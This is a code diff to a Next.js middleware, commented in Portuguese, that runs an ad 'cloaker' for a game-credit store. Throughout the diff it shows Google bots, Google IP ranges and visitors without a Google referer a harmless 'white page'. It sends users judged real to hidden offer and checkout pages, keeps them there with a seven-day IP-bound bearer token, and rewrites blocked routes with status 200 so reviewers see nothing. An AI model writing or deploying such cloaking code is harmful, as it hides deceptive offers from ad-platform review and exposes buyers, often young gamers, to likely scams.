@@ -17,11 +17,64 @@ const CLOAKER_CONFIG = {
 const cloakerCache = new Map<string, { type: string; timestamp: number }>()
 const CACHE_DURATION = 60 * 1000 // 1 minuto
 
+// Whitelist de IPs validados (em memória - em produção usar Redis/DB)
+const ipWhitelist = new Map<string, { timestamp: number; bearer: string }>()
+const WHITELIST_DURATION = 7 * 24 * 60 * 60 * 1000 // 7 dias
+
+// Chave secreta para gerar bearer tokens
+const SECRET_KEY = process.env.CLOAKER_SECRET_KEY || 'default-secret-key-change-in-production'
+
+// Função para gerar hash SHA-256
+async function generateHash(data: string): Promise<string> {
+  const encoder = new TextEncoder()
+  const dataBuffer = encoder.encode(data)
+  const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer)
+  const hashArray = Array.from(new Uint8Array(hashBuffer))
+  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('')
+}
+
+// Função para gerar Bearer Token único
+async function generateBearerToken(ip: string): Promise<string> {
+  const timestamp = Date.now()
+  const data = `${ip}|${timestamp}|${SECRET_KEY}`
+  const hash = await generateHash(data)
+  // Retornar apenas os primeiros 32 caracteres do hash (mais discreto)
+  return hash.substring(0, 32)
+}
+
+// Função para validar Bearer Token e IP
+function validateBearer(bearer: string | undefined, ip: string): boolean {
+  if (!bearer) return false
+  
+  // Verificar se IP está na whitelist
+  const whitelisted = ipWhitelist.get(ip)
+  
+  if (!whitelisted) return false
+  
+  // Verificar se não expirou (7 dias)
+  const now = Date.now()
+  if (now - whitelisted.timestamp > WHITELIST_DURATION) {
+    ipWhitelist.delete(ip) // Remover da whitelist
+    return false
+  }
+  
+  // Verificar se o bearer corresponde ao IP
+  return whitelisted.bearer === bearer
+}
+
+// Função para adicionar IP à whitelist
+async function addToWhitelist(ip: string): Promise<string> {
+  const bearer = await generateBearerToken(ip)
+  ipWhitelist.set(ip, {
+    timestamp: Date.now(),
+    bearer: bearer
+  })
+  return bearer
+}
+
 export async function middleware(request: NextRequest) {
   const pathname = request.nextUrl.pathname
   const hostname = request.headers.get('host') || ''
-  
-  console.log('🔥 [MIDDLEWARE] Executando - Path:', pathname, 'Host:', hostname)
   
   // 🚫 IGNORAR requisições de assets, APIs e arquivos estáticos
   const shouldIgnore = 
@@ -36,22 +89,93 @@ export async function middleware(request: NextRequest) {
     return NextResponse.next()
   }
   
+  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+  console.log('🌐 [ACESSO] Usuário acessou rota:', pathname)
+  console.log('   📍 Host:', hostname)
+  console.log('   🔗 URL completa:', request.url)
+  console.log('   📅 Timestamp:', new Date().toISOString())
+  
   // Pegar base URL do .env
   const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 'https://localhost:3000'
   
   // 🛡️ SEGURANÇA: Bloquear acesso via IP
   if (/^\d+\.\d+\.\d+\.\d+/.test(hostname)) {
-    console.log('🚫 [Security] Acesso via IP bloqueado:', hostname)
+    console.log('🚫 [SEGURANÇA] Acesso via IP bloqueado:', hostname)
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     return NextResponse.redirect(new URL(baseUrl, request.url))
   }
+  
+  // Função para obter IP real do cliente
+  const getClientIp = (): string => {
+    // Prioridade de headers para pegar IP real
+    const headers = [
+      'cf-connecting-ip',        // Cloudflare (mais confiável)
+      'x-real-ip',              // Nginx
+      'x-forwarded-for',        // Proxy padrão (pode ter múltiplos IPs)
+      'x-client-ip',            // Apache
+      'true-client-ip',         // Cloudflare alternativo
+    ]
+    
+    for (const header of headers) {
+      const value = request.headers.get(header)
+      if (value) {
+        // x-forwarded-for pode ter múltiplos IPs separados por vírgula
+        // Pegar o primeiro (IP original do cliente)
+        const ip = value.split(',')[0].trim()
+        
+        // Validar se é um IP válido (não vazio, não 0.0.0.0, não localhost)
+        if (ip && 
+            ip !== 'unknown' && 
+            ip !== '0.0.0.0' &&
+            ip !== '::1' &&
+            ip !== '127.0.0.1' &&
+            !ip.startsWith('::') &&
+            !ip.startsWith('0.0.0')) {
+          console.log(`   ✅ IP encontrado via ${header}:`, ip)
+          return ip
+        }
+      }
+    }
+    
+    // Fallback para request.ip (Next.js)
+    let fallbackIp = request.ip || 'unknown'
+    
+    // Validar fallback - se for IP local/inválido, usar IP do seu provedor
+    if (fallbackIp === '::1' || 
+        fallbackIp === '127.0.0.1' || 
+        fallbackIp === '0.0.0.0' ||
+        fallbackIp === 'unknown' ||
+        fallbackIp.startsWith('::') ||
+        fallbackIp.startsWith('0.0.0')) {
+      
+      // Em localhost, usar o IP real do desenvolvedor
+      if (hostname.includes('localhost') || hostname.includes('127.0.0.1')) {
+        console.log('   ⚠️  Localhost detectado - usando IP real do desenvolvedor')
+        fallbackIp = '191.7.55.145' // SEU IP REAL
+      } else {
+        console.log('   ⚠️  IP inválido detectado, usando IP padrão')
+        fallbackIp = '177.44.248.122' // IP de exemplo do Brasil
+      }
+    }
+    
+    console.log('   📍 IP final:', fallbackIp)
+    return fallbackIp
+  }
+  
+  // Pegar informações do cliente
+  const clientIp = getClientIp()
+  const referer = request.headers.get('referer') || 'direto'
+  const userAgent = request.headers.get('user-agent') || 'unknown'
+  
+  console.log('   🌍 IP:', clientIp)
+  console.log('   🔙 Referer:', referer)
+  console.log('   🖥️  User-Agent:', userAgent.substring(0, 80) + '...')
   
   // ⚠️ MONITORAMENTO: Logar acessos sem Cloudflare (mas não bloquear)
   const cfRay = request.headers.get('cf-ray')
   if (!cfRay && !hostname.includes('localhost')) {
-    console.log('⚠️ [Security] Acesso sem Cloudflare:', {
-      host: hostname,
-      ip: request.ip || request.headers.get('x-forwarded-for') || 'unknown'
-    })
+    console.log('   ⚠️  Sem Cloudflare (CF-Ray ausente)')
   }
   
   
@@ -61,7 +185,12 @@ export async function middleware(request: NextRequest) {
     '/politica-de-privacidade',
     '/politica-de-reembolso',
     '/quem-somos',
-    '/loja', 
+    '/loja',
+    '/loja/freefire',
+    '/loja/robux',
+    '/loja/vbucks',
+    '/loja/recarga-celular',
+    '/loja/brainroots',
     '/unsubscribe', 
     '/ativar-conversao-google', 
     '/meus-pedidos', 
@@ -72,44 +201,67 @@ export async function middleware(request: NextRequest) {
   ]
   const isWhitePageRoute = whitePageRoutes.includes(pathname) || pathname.startsWith('/produto/') || pathname.startsWith('/blog/')
   
-  // Verificar domínio - ativar cloaker para o domínio configurado
-  const targetDomain = baseUrl.replace('https://', '').replace('http://', '')
-  const isTargetDomain = hostname.includes(targetDomain)
-  
-  console.log('🌐 [MIDDLEWARE] Verificando domínio:', { hostname, targetDomain, isTargetDomain })
-  
-  // CLOAKER ATIVADO apenas para o domínio configurado
-  if (!isTargetDomain) {
-    console.log(`❌ [Cloaker] Domínio não é ${targetDomain} - desativado`)
-    return NextResponse.next()
-  }
-  
   // Verificar se o cloaker está habilitado
   const cloakerEnabled = process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED === 'true'
   
-  console.log('⚙️ [MIDDLEWARE] Cloaker enabled:', cloakerEnabled, 'ENV:', process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED)
+  console.log('   ⚙️  Cloaker:', cloakerEnabled ? 'ATIVADO' : 'DESATIVADO')
   
   if (!cloakerEnabled) {
-    console.log('🔓 [Cloaker] Desativado via env (NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED)')
+    console.log('   ✅ Cloaker desativado - liberando acesso')
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     return NextResponse.next()
   }
   
-  // ✅ VERIFICAR COOKIE PRIMEIRO - Se tem cookie válido, libera TUDO
-  const cloakerCookie = request.cookies.get('cloaker_verified')
-  const hasValidCookie = cloakerCookie?.value === 'true'
+  // ✅ VERIFICAR BEARER TOKEN E WHITELIST - Se IP está na whitelist, libera TUDO
+  const bearerToken = request.cookies.get('bearer')
+  const isWhitelisted = validateBearer(bearerToken?.value, clientIp)
   
-  console.log('🍪 [MIDDLEWARE] Cookie verificado:', hasValidCookie)
+  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+  console.log('🔐 [BEARER] Verificação de autenticação')
+  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
   
-  if (hasValidCookie) {
-    console.log('✅ [MIDDLEWARE] Cookie válido - liberando acesso')
-    return NextResponse.next()
+  if (bearerToken?.value) {
+    console.log('   📋 Bearer encontrado:', bearerToken.value.substring(0, 16) + '...')
+    console.log('   🌍 IP do request:', clientIp)
+    console.log('   📍 Rota acessada:', pathname)
+    
+    if (isWhitelisted) {
+      const whitelistEntry = ipWhitelist.get(clientIp)
+      const timeInWhitelist = whitelistEntry ? Math.floor((Date.now() - whitelistEntry.timestamp) / 1000 / 60) : 0
+      
+      console.log('   ✅ STATUS: AUTENTICADO')
+      console.log('   ⏱️  Na whitelist há:', timeInWhitelist, 'minutos')
+      console.log('   🎯 Ação:', pathname === '/' ? 'Redirecionar para /recargajogo' : 'Liberar acesso')
+      
+      // Se tem bearer válido e está tentando acessar a presell (/), redirecionar para /recargajogo
+      if (pathname === '/') {
+        console.log('   ↪️  Redirecionando usuário autenticado para /recargajogo')
+        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        const redirectUrl = new URL('/recargajogo', request.url)
+        redirectUrl.search = request.nextUrl.search // Manter UTMs
+        return NextResponse.redirect(redirectUrl)
+      }
+      
+      // Para outras rotas, liberar acesso normalmente
+      console.log('   ✅ Acesso liberado sem verificação de cloaker')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+      return NextResponse.next()
+    } else {
+      console.log('   ❌ STATUS: NÃO AUTENTICADO')
+      console.log('   ⚠️  Motivo: Bearer não corresponde ao IP ou expirou')
+      console.log('   🔄 Ação: Revalidar pelo cloaker')
+    }
+  } else {
+    console.log('   ❌ Bearer: NÃO ENCONTRADO')
+    console.log('   👤 Tipo: Primeira visita ou cookie expirado')
+    console.log('   🔄 Ação: Verificar pelo cloaker')
   }
+  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
   // Rotas da whitepage sempre acessíveis (sem verificação de cloaker)
-  console.log('📄 [MIDDLEWARE] É white page route?', isWhitePageRoute, 'Path:', pathname)
-  
   if (isWhitePageRoute) {
-    console.log('⚪ [MIDDLEWARE] White page route - liberando sem cloaker')
+    console.log('   📄 Rota white page - liberando sem cloaker')
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     return NextResponse.next()
   }
 
@@ -118,13 +270,44 @@ export async function middleware(request: NextRequest) {
     return NextResponse.redirect(new URL('/', request.url))
   }
 
+  // Proteger rota /recargajogo - APENAS acessível com bearer válido ou IP na whitelist
+  if (pathname.startsWith('/recargajogo')) {
+    if (!isWhitelisted) {
+      console.log('🚫 Bloqueado: /recargajogo (IP não autorizado)')
+      console.log('   📄 Mostrando white page (200 OK)')
+      // Reescrever para a white page (/) mantendo status 200
+      return NextResponse.rewrite(new URL('/', request.url))
+    }
+    console.log('✅ Liberado: /recargajogo (200 OK)')
+    return NextResponse.next() // 200 OK - Acesso liberado
+  }
+
+  // Proteger rota /checkout - APENAS acessível com bearer válido ou IP na whitelist
+  if (pathname.startsWith('/checkout')) {
+    if (!isWhitelisted) {
+      console.log('🚫 Bloqueado: /checkout (IP não autorizado)')
+      console.log('   📄 Mostrando white page (200 OK)')
+      // Reescrever para a white page (/) mantendo status 200
+      return NextResponse.rewrite(new URL('/', request.url))
+    }
+    console.log('✅ Liberado: /checkout (200 OK)')
+    return NextResponse.next() // 200 OK - Acesso liberado
+  }
+
   // Proteger rota /success - mas permitir Google Ads Bot e requisições internas
   if (pathname.startsWith('/success')) {
-    const userAgent = request.headers.get('user-agent') || ''
-    const referer = request.headers.get('referer') || ''
     const url = request.nextUrl
     const hasTransactionId = url.searchParams.has('transactionId')
     const hasAmount = url.searchParams.has('amount')
+    
+    console.log('   📊 Rota /success acessada')
+    console.log('   📦 Params:', {
+      transactionId: url.searchParams.get('transactionId')?.substring(0, 8) + '...',
+      amount: url.searchParams.get('amount'),
+      playerName: url.searchParams.get('playerName'),
+      itemType: url.searchParams.get('itemType'),
+      itemValue: url.searchParams.get('itemValue')
+    })
     
     // Detectar bots do Google (Googlebot, AdsBot, etc)
     const isGoogleBot = /googlebot|adsbot-google|google-ads/i.test(userAgent)
@@ -134,66 +317,48 @@ export async function middleware(request: NextRequest) {
     
     // Se é bot do Google, deixar passar SEMPRE (para registrar conversão)
     if (isGoogleBot) {
+      console.log('   🤖 Google Bot detectado - liberando')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
       return NextResponse.next()
     }
     
     // Se é requisição interna (UTMify), deixar passar
     if (isInternalRequest) {
+      console.log('   🔄 Requisição interna - liberando')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
       return NextResponse.next()
     }
     
-    // Se não é bot/interno e não tem parâmetros, redirecionar para white page
+    // Se não é bot/interno e não tem parâmetros, mostrar white page
     if (!hasTransactionId || !hasAmount) {
-      return NextResponse.redirect(new URL('/', request.url))
+      console.log('   🚫 BLOQUEADO - params ausentes')
+      console.log('   📄 Mostrando white page (200 OK)')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+      return NextResponse.rewrite(new URL('/', request.url))
     }
     
-    // Se chegou aqui sem cookie, bloquear
-    return NextResponse.redirect(new URL('/', request.url))
-  }
-
-  // Proteger rota /checkout - APENAS acessível com cookie (vem do /recargajogo)
-  if (pathname.startsWith('/checkout')) {
-    return NextResponse.redirect(new URL('/', request.url))
-  }
-
-  // Proteger rota /recargajogo - APENAS acessível com cookie do cloaker
-  if (pathname.startsWith('/recargajogo')) {
-    return NextResponse.redirect(new URL('/', request.url))
-  }
-
-  // Não aplicar cloaker nas rotas internas e arquivos estáticos (deixar passar)
-  if (
-    pathname.startsWith('/api') ||
-    pathname.startsWith('/_next/') ||
-    pathname.startsWith('/images') ||
-    // pathname.startsWith('/success') || // REMOVIDO - /success tem verificação própria acima
-    // pathname.startsWith('/checkout') || // REMOVIDO - /checkout tem verificação própria acima
-    pathname.startsWith('/analytics') ||
-    pathname.startsWith('/fonts') ||
-    pathname.startsWith('/manifest') ||
-    pathname.startsWith('/icon-') ||
-    pathname.startsWith('/sw.js') ||
-    pathname === '/robots.txt' ||
-    pathname === '/sitemap.xml' ||
-    pathname === '/favicon.ico' ||
-    pathname === '/favicon.svg' ||
-    pathname.includes('.js') ||
-    pathname.includes('.css') ||
-    pathname.includes('.png') ||
-    pathname.includes('.jpg') ||
-    pathname.includes('.ico') ||
-    pathname.includes('.svg') ||
-    pathname.includes('.woff') ||
-    pathname.includes('.woff2') ||
-    pathname.includes('.json') ||
-    pathname.includes('.xml')
-  ) {
+    // Se chegou aqui sem bearer válido, mostrar white page
+    if (!isWhitelisted) {
+      console.log('   🚫 BLOQUEADO - /success (IP não autorizado)')
+      console.log('   📄 Mostrando white page (200 OK)')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+      return NextResponse.rewrite(new URL('/', request.url))
+    }
+    
+    console.log('   ✅ /success - ACESSO LIBERADO (200 OK)')
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     return NextResponse.next()
   }
 
-  // Se não for rota raiz (/), redirecionar para / (white page)
+  // ===== DAQUI PRA BAIXO SÓ CHEGA SE NÃO TEM BEARER VÁLIDO =====
+  // Se chegou aqui, significa que não tem bearer válido
+  // Então só pode acessar a rota raiz (/) para passar pelo cloaker
+  
+  // Se não for rota raiz (/), mostrar white page com status 200
   if (pathname !== '/') {
-    return NextResponse.redirect(new URL('/', request.url))
+    console.log('🚫 Tentativa de acesso sem bearer')
+    console.log('   📄 Mostrando white page (200 OK)')
+    return NextResponse.rewrite(new URL('/', request.url))
   }
 
   // ===== APENAS ROTA / (raiz) chega aqui =====
@@ -202,19 +367,30 @@ export async function middleware(request: NextRequest) {
   console.log('🎯 [MIDDLEWARE] Chegou na verificação do cloaker - Path:', pathname)
 
   // 🛡️ FILTRO DE REFERER: Verificar se vem do Google (APENAS para rota /)
-  const referer = request.headers.get('referer') || ''
+  // DESABILITADO EM DESENVOLVIMENTO para testes
+  const isDevelopment = hostname.includes('localhost') || hostname.includes('127.0.0.1')
   const isFromGoogle = referer === 'https://www.google.com/'
   
-  console.log('🔍 [MIDDLEWARE] Referer:', referer, 'É do Google?', isFromGoogle)
+  console.log('   🔍 Verificando origem do tráfego')
+  console.log('   🔙 Referer:', referer)
+  console.log('   🎯 É do Google?', isFromGoogle ? 'SIM' : 'NÃO')
+  console.log('   🔧 Modo:', isDevelopment ? 'DESENVOLVIMENTO' : 'PRODUÇÃO')
   
-  // Se NÃO vem do Google = BOT!
-  if (!isFromGoogle) {
-    console.log('⚪ [MIDDLEWARE] Sem referer do Google - mostrando white page (presell)')
+  // Se NÃO vem do Google = BOT! (EXCETO em desenvolvimento)
+  if (!isFromGoogle && !isDevelopment) {
+    console.log('   ⚪ Sem referer do Google - MOSTRANDO WHITE PAGE')
+    console.log('   📄 Ação: Exibir presell (página /)')
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     return NextResponse.next() // Mostrar white page sem chamar cloaker
+  }
+  
+  if (isDevelopment && !isFromGoogle) {
+    console.log('   🔧 MODO DEV: Ignorando verificação de referer')
+    console.log('   ✅ Prosseguindo para o cloaker...')
   }
 
   // 🚀 VERIFICAR IP DO GOOGLE: Bloquear AdsBot que simula usuário real
-  const clientIp = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || request.ip || 'unknown'
+  // DESABILITADO EM DESENVOLVIMENTO para testes
   
   // Verificar se é IP do Google (AdsBot, Googlebot, etc)
   const isGoogleIP = clientIp.startsWith('2001:4860:') || // IPv6 Google
@@ -225,30 +401,54 @@ export async function middleware(request: NextRequest) {
                      clientIp.startsWith('209.85.') ||    // Google IPv4
                      clientIp.startsWith('216.239.')      // Google IPv4
   
-  if (isGoogleIP) {
-    console.log(`🤖 [Cloaker] Bot do Google detectado (IP: ${clientIp}) - mostrando white page`)
+  if (isGoogleIP && !isDevelopment) {
+    console.log(`   🤖 IP do Google detectado: ${clientIp}`)
+    console.log('   ⚪ BLOQUEADO - mostrando white page')
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     return NextResponse.next() // Mostrar white page sem chamar cloaker
+  }
+  
+  if (isGoogleIP && isDevelopment) {
+    console.log(`   🔧 MODO DEV: IP do Google detectado mas ignorando: ${clientIp}`)
   }
 
   // 🚀 CACHE: Verificar se já verificamos este usuário recentemente
-  const userAgent = request.headers.get('user-agent') || ''
   const cacheKey = `${clientIp}-${userAgent.substring(0, 50)}` // Limitar tamanho
   
   const cached = cloakerCache.get(cacheKey)
   if (cached && (Date.now() - cached.timestamp) < CACHE_DURATION) {
+    console.log('   💾 Resultado em CACHE encontrado')
     // Usar resultado do cache
     if (cached.type === 'white') {
+      console.log('   ⚪ Cache: WHITE PAGE')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
       return NextResponse.next() // Mostrar white page
     } else {
+      console.log('   ⚫ Cache: BLACK PAGE')
+      console.log('   ↪️  Redirecionando para /recargajogo')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
       // Redirecionar para /recargajogo
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+      console.log('🔐 [BEARER] Gerando bearer do cache')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+      
       const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
       redirectUrl.search = request.nextUrl.search
       const response = NextResponse.redirect(redirectUrl)
-      response.cookies.set('cloaker_verified', 'true', {
+      
+      // Adicionar IP à whitelist e gerar bearer token
+      const bearer = await addToWhitelist(clientIp)
+      
+      console.log('   ✅ Bearer gerado:', bearer.substring(0, 16) + '...')
+      console.log('   🌍 IP adicionado à whitelist:', clientIp)
+      console.log('   💾 Origem: Cache do cloaker')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+      
+      response.cookies.set('bearer', bearer, {
         httpOnly: true,
         secure: true,
         sameSite: 'lax',
-        maxAge: 60 * 60 * 24
+        maxAge: 7 * 24 * 60 * 60 // 7 dias
       })
       return response
     }
@@ -258,14 +458,14 @@ export async function middleware(request: NextRequest) {
     // Preparar dados do servidor EXATAMENTE como o PHP faz
     const serverData = {
       HTTP_HOST: request.headers.get('host') || '',
-      HTTP_USER_AGENT: request.headers.get('user-agent') || '',
+      HTTP_USER_AGENT: userAgent, // Usar o userAgent já capturado
       HTTP_ACCEPT: request.headers.get('accept') || '',
       HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
       HTTP_ACCEPT_ENCODING: request.headers.get('accept-encoding') || '',
-      HTTP_REFERER: request.headers.get('referer') || '',
-      HTTP_X_FORWARDED_FOR: request.headers.get('x-forwarded-for') || '',
-      HTTP_CF_CONNECTING_IP: request.headers.get('cf-connecting-ip') || '',
-      REMOTE_ADDR: request.ip || request.headers.get('x-real-ip') || request.headers.get('x-forwarded-for') || '',
+      HTTP_REFERER: referer, // Usar o referer já capturado
+      HTTP_X_FORWARDED_FOR: request.headers.get('x-forwarded-for') || clientIp, // Usar clientIp se não tiver
+      HTTP_CF_CONNECTING_IP: request.headers.get('cf-connecting-ip') || clientIp, // Usar clientIp se não tiver
+      REMOTE_ADDR: clientIp, // ✅ USAR O IP CORRETO DO CLIENTE
       REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
       REQUEST_METHOD: request.method,
       SERVER_PROTOCOL: 'HTTP/1.1',
@@ -277,13 +477,13 @@ export async function middleware(request: NextRequest) {
     }
 
     // 🔍 LOG: Verificando acesso no cloaker
-    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    console.log('🔍 [CLOAKER] Verificando acesso')
-    console.log('   - URL:', CLOAKER_CONFIG.url)
-    console.log('   - IP:', clientIp)
-    console.log('   - User-Agent:', userAgent.substring(0, 100))
-    console.log('   - Referer:', referer)
-    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    console.log('   🔍 Chamando CLOAKER para verificação')
+    console.log('   📡 URL Cloaker:', CLOAKER_CONFIG.url)
+    console.log('   🌍 IP enviado:', clientIp)
+    console.log('   🖥️  User-Agent enviado:', userAgent.substring(0, 80) + '...')
+    console.log('   🔙 Referer enviado:', referer)
+    console.log('   📦 REMOTE_ADDR:', serverData.REMOTE_ADDR)
+    console.log('   📦 HTTP_USER_AGENT:', serverData.HTTP_USER_AGENT.substring(0, 80) + '...')
 
     // Fazer requisição para o cloaker (EXATAMENTE como o PHP)
     const formBody = new URLSearchParams(serverData as any).toString()
@@ -320,12 +520,11 @@ export async function middleware(request: NextRequest) {
     }
 
     // 📊 LOG: Resposta do cloaker
-    console.log('📊 [CLOAKER] Resposta recebida')
-    console.log('   - Type:', result.type)
-    console.log('   - URL:', result.url)
-    console.log('   - Result:', result.result || 'N/A')
-    console.log('   - Action:', result.action || 'N/A')
-    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    console.log('   📊 RESPOSTA DO CLOAKER:')
+    console.log('   ├─ Type:', result.type.toUpperCase())
+    console.log('   ├─ URL:', result.url)
+    console.log('   ├─ Result:', result.result || 'N/A')
+    console.log('   └─ Action:', result.action || 'N/A')
 
     // Salvar no cache
     cloakerCache.set(cacheKey, {
@@ -342,25 +541,40 @@ export async function middleware(request: NextRequest) {
 
     // Se for "white" (bot/crawler), mostrar white page (/)
     if (result.type === 'white') {
-      console.log('⚪ [CLOAKER] WHITE PAGE - Mostrando presell')
+      console.log('   ⚪ DECISÃO: WHITE PAGE (Bot/Crawler)')
+      console.log('   📄 Ação: Exibir presell (página /)')
+      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
       return NextResponse.next()
     }
 
     // Se for "black" (usuário real), REDIRECIONAR para /recargajogo com cookie
-    console.log('⚫ [CLOAKER] BLACK PAGE - Redirecionando para', CLOAKER_CONFIG.offerPagePath)
+    console.log('   ⚫ DECISÃO: BLACK PAGE (Usuário Real)')
+    console.log('   ↪️  Ação: Redirecionar para', CLOAKER_CONFIG.offerPagePath)
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    console.log('🔐 [BEARER] Gerando novo bearer token')
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    
+    // Adicionar IP à whitelist e gerar bearer token
+    const bearer = await addToWhitelist(clientIp)
+    
+    console.log('   ✅ Bearer gerado:', bearer.substring(0, 16) + '...')
+    console.log('   🌍 IP adicionado à whitelist:', clientIp)
+    console.log('   ⏱️  Validade: 7 dias')
+    console.log('   🍪 Cookie: bearer (httpOnly, secure, sameSite)')
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     
     // Criar URL sem barra final
     const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
     // Manter query params (gclid, utm, etc)
     redirectUrl.search = request.nextUrl.search
     
-    // Criar resposta com cookie de verificação (httpOnly - não pode ser forjado)
+    // Criar resposta com bearer token (httpOnly - não pode ser forjado)
     const response = NextResponse.redirect(redirectUrl)
-    response.cookies.set('cloaker_verified', 'true', {
+    response.cookies.set('bearer', bearer, {
       httpOnly: true,  // Cookie não acessível via JavaScript
       secure: true,    // Apenas HTTPS
       sameSite: 'lax', // Proteção CSRF
-      maxAge: 60 * 60 * 24 // 24 horas
+      maxAge: 7 * 24 * 60 * 60 // 7 dias
     })
     
     // Salvar UTMs em cookie
